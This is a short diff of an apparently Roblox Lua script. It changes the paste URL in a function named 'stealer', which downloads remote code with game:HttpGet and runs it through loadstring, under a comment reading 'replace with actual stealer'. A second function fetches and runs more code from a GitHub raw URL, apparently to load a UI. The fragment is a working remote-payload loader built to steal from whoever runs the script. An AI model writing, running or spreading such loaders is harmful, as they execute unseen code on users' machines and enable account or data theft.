@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/75KeBqOonSYEusom/raw", true))() -- replace with actual stealer
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/IDD1VU3M61NxuFWo/raw", true))() -- replace with actual stealer
 end
 local function loadui()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/script-wq/testing1/refs/heads/main/testing"))()
